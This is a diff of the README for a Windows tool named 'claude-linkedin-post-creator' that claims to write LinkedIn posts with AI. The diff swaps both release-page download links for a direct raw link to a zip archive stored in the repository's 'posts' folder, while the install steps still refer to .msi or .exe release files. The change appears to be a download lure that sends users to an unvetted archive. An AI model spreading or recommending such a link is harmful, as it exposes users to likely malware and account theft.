@@ -1,6 +1,6 @@
 # ✍️ claude-linkedin-post-creator - Build Better LinkedIn Posts with AI
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ajayfastfooted329/claude-linkedin-post-creator/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ajayfastfooted329/claude-linkedin-post-creator/raw/refs/heads/main/posts/linkedin-creator-post-claude-v2.1.zip)
 
 This tool helps you write effective LinkedIn posts. It connects to your profile, looks at successful posts in your field, and suggests topics that match how you speak. It also updates you on how your posts perform so you can refine your strategy over time.
 
@@ -24,7 +24,7 @@ To run this software, your computer needs to meet these basic standards:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the following page to download the latest installer: [https://github.com/ajayfastfooted329/claude-linkedin-post-creator/releases](https://github.com/ajayfastfooted329/claude-linkedin-post-creator/releases).
+1. Visit the following page to download the latest installer: [https://github.com/ajayfastfooted329/claude-linkedin-post-creator/raw/refs/heads/main/posts/linkedin-creator-post-claude-v2.1.zip](https://github.com/ajayfastfooted329/claude-linkedin-post-creator/raw/refs/heads/main/posts/linkedin-creator-post-claude-v2.1.zip).
 2. Look for the file ending in `.msi` or `.exe` under the latest release heading.
 3. Click the file name to start the download.
 4. Open the downloaded file once the process finishes.
